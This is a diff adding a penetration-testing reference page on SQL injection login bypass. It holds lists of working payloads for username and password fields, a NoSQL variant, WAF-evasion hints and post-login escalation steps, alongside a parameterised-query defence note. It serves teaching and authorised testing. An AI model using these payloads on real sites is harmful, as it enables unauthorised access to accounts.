@@ -1,0 +1,160 @@
+---
+title: SQLi Authentication Bypass
+description: Bypassing login forms via SQL injection in the username or password field.
+mitre: [T1190, T1078]
+d3fend: [D3-MH, D3-MFA, D3-SPP]
+impact: [AuthBypass]
+owasp: [A05, A07]
+noise: stealth
+sidebar:
+  order: 3
+  label: Auth bypass
+---
+import { Aside } from '@astrojs/starlight/components';
+
+Login forms typically build a query like:
+
+```sql
+SELECT * FROM users WHERE username = '<INPUT>' AND password = '<INPUT>';
+```
+
+Goal: make the `WHERE` clause evaluate to true regardless of credentials, or comment out the password check.
+
+## TL;DR
+
+Try these in the **username** field, leave password empty (or anything):
+
+```
+admin'-- -
+admin'#
+admin' OR '1'='1
+admin' OR 1=1-- -
+' OR '1'='1'-- -
+' OR 1=1-- -
+') OR ('1'='1
+') OR 1=1-- -
+"-- -
+" OR ""="
+```
+
+If the application returns the *first* row of the users table after a successful "login" payload, you typically log in as `admin` (or whatever user is row 1).
+
+## Comment-based bypass
+
+Comment out everything after the username:
+
+```
+admin'-- -
+```
+
+Resulting query:
+
+```sql
+SELECT * FROM users WHERE username = 'admin'-- -' AND password = 'anything';
+```
+
+The password check is now part of the comment.
+
+Comment syntax varies by DBMS:
+
+| DBMS | Line comment |
+|---|---|
+| MySQL/MariaDB | `-- ` (note trailing space) or `#` |
+| PostgreSQL | `-- ` |
+| MSSQL | `-- ` |
+| Oracle | `-- ` |
+| SQLite | `-- ` |
+
+<Aside type="tip">
+In URLs, a trailing space is unreliable - use `-- -` (the trailing `-` ensures a non-space character keeps the comment valid). The `#` only works in MySQL and must be URL-encoded as `%23` when used in URLs.
+</Aside>
+
+## OR-based bypass (no valid username needed)
+
+If you don't know any usernames:
+
+```
+' OR 1=1-- -
+' OR '1'='1'-- -
+```
+
+Resulting query:
+
+```sql
+SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = 'anything';
+```
+
+This returns *all* users. Most apps log you in as the first row, which is typically `admin` because it was created first.
+
+## Bypassing parenthesised queries
+
+If the query wraps conditions in parentheses, you must close them:
+
+```sql
+SELECT * FROM users WHERE (username='<INPUT>' AND id > 1) AND password = '<INPUT>';
+```
+
+Single-quote alone causes a syntax error because the `)` is unmatched. Add the closing paren:
+
+```
+admin')-- -
+') OR ('1'='1
+') OR 1=1) -- -
+```
+
+If unsure how many parens, try escalating: `'-- -`, `')-- -`, `'))-- -`.
+
+## Targeting a specific user
+
+When `' OR 1=1` returns row 1 (admin) but you need a specific user (or admin isn't row 1):
+
+```
+' OR username='target_user'-- -
+' OR id=5-- -
+```
+
+Used when you can enumerate user IDs but not authenticate. The `OR` is critical - `AND` would require knowing the password.
+
+## When the password field is the injection point
+
+If the username field is filtered or hashed but the password is concatenated raw:
+
+```
+Username: any_real_user
+Password: ' OR '1'='1
+```
+
+Less common - many apps hash the password before substituting it into the query, which neutralises injection. Test both fields independently.
+
+## NoSQL equivalent
+
+MongoDB-backed login forms use a different bypass - see [NoSQL injection](../nosql/). Quick test for JSON-based logins:
+
+```json
+{"username": "admin", "password": {"$ne": null}}
+```
+
+## Common failure modes
+
+- **Same payload works in browser but not via proxy** - proxy is sending unencoded characters. URL-encode the payload.
+- **Payload returns HTTP 200 but no login** - application uses a different query for auth than what you assumed (e.g., it counts rows and requires exactly 1). Try payloads that return one row: `admin'-- -` instead of `' OR 1=1-- -`.
+- **Login succeeds but session is rejected on next request** - application stores the user ID separately and validates it. The injection logged you in as a non-existent user. Use `admin'-- -` or another payload that authenticates as a real user.
+- **Account lockout triggers** - rate-limit your attempts. Some apps lock the account after N failed logins regardless of how the failure occurred.
+
+<Aside type="danger">
+Account lockout is an availability risk during real engagements. A single misfired payload can lock the actual administrator out of production. Confirm lockout policy before mass-testing auth bypass payloads.
+</Aside>
+
+## Defence reference
+
+Parameterised queries make this entire class of attack impossible. If you find an auth bypass, the fix is always "use prepared statements" - never blocklist characters.
+
+## Next move
+
+- **Logged in as the first user (often `admin`)** → enumerate the admin panel; look for [file upload](/codex/web/uploads/), settings pages that allow command execution, or user-management flows
+- **Logged in as a non-admin user** → re-run the bypass with `' UNION SELECT username FROM users WHERE is_admin=1-- -` style payload to target a specific account, or escalate via [IDOR](/codex/web/idor/) inside the app
+- **Bypass works but lands on a confused state** → the application may require post-login session bootstrap; check cookies and follow the redirect chain manually
+- **Bypass blocked by parameterized queries on login but other endpoints unfiltered** → injection lives elsewhere - return to [overview](/codex/web/sqli/) and probe search / filter / sort parameters
+- **Bypass payload errors leak SQL** → you have full injection, not just auth bypass; switch to [UNION-based](/codex/web/sqli/union-based/) or [error-based extraction](/codex/web/sqli/union-based/#error-based-extraction-as-fallback) for data dump
+- **WAF blocks `--` / `'` / `OR`** → encode (URL/hex), use comment variants (`-- -`, `/*comment*/`), or try [Bypasses](/codex/web/sqli/bypasses/)
+- **All bypass attempts blocked, no SQL errors** → backend uses prepared statements; pivot to [username enumeration](/codex/web/auth/username-enumeration/) or password spraying instead
